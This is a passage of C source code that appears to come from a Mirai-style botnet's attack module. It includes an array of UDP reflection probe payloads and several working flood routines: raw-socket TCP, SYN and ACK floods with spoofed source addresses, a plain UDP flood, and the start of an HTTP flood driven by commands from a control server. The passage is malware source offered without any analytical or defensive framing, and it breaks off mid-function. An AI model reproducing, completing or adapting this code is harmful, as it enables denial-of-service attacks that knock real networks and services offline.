            "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + "",
            "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00",
            "\x00\x01\x00\x02\x00\x01\x00",
            "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00",
            "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07 default\x00\x00\x00\x00",
            "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01",
            "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10",
            "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5",
            "SNQUERY: 127.0.0.1:AAAAAA:xsvr",
            "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0",
            "\x02",
            "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a",
            "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01",
            "xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6",
    };
    
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            send(fds[i], strings[i], strlen(strings[i]) + 1, MSG_NOSIGNAL);
        }
    }
}

void attack_method_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        while (1)
            sleep(1);
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        while (1)
            sleep(1);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        uint8_t *opts;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        // TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
        *opts++ = 4;                    // Length
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);

        // TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        // TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        // TCP nop
        *opts++ = 1;

        // TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6; // 2^6 = 64, window size scale = 64
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;

        rand_str(payload, data_len);
    }

//    targs[0].sock_addr.sin_port = tcph->dest;
//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
//    {
//
//    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_app_http2(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char generic_memes[10241] = {0};

    if (domain == NULL || path == NULL)
        return;

    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (util_strlen(method) > 9)
        return;

    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
    // yes it would segfault but we only update the values if they are not already uppercase.
    // if the method is lowercase and its passed from the CNC we can update that memory no problem
    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    // unlock frequently used strings
    table_unlock_val(TABLE_ATK_SET_COOKIE);
    table_unlock_val(TABLE_ATK_REFRESH_HDR);
    table_unlock_val(TABLE_ATK_LOCATION_HDR);
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
    table_unlock_val(TABLE_ATK_CHUNKED);
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);
    table_unlock_val(TABLE_ATK_DOSARREST);
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

    http_table = calloc(sockets, sizeof(struct attack_http_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].path, path);

        if (http_table[i].path[0] != '/')
        {
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';
        }

        util_strcpy(http_table[i].orig_method, method);
        util_strcpy(http_table[i].method, method);

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
